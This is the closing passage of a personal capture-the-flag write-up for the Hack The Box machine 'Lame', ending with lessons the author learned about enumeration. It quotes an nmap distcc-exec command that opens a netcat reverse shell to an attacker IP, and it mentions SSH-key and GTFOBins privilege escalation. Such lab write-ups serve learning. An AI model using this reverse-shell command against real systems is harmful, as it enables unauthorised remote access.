There is also a writeup on the `distcc` exploit that I used: https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html
I like the remote shell command which is simpler than me:
```
nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.14.24 443'"
```
There are also multiple ways to get privilege escalation. The first one is by using a vulnerability on how the root SSH key has been generated (see CVE-2008-0166). It makes the key predictable, and you can get the private key back from the public key.
I had been a bit lucky (and helped by the syntax coloration of linpeas.sh) to guess that nmap could be used to get privilege escalation. However, there is the GTFOBins website that can be used to find how to escalate privilege with different binaries: https://gtfobins.github.io/
## Lessons learned
I could break this box so much quickly. I lost time on the Samba server, trying to connect and looking into the files in it. I also missed the `distcc` open port at first because I focused on the vulnerable FTP server without finishing the enumeration.
In the future:
* I should do a proper enumeration first by looking at the data available and what could be possible to exploit without doing right now,
* I should read carefully the logs of the scan,
* I should search for different names of a service in searchsploit (not only `smb` but also `samba`)
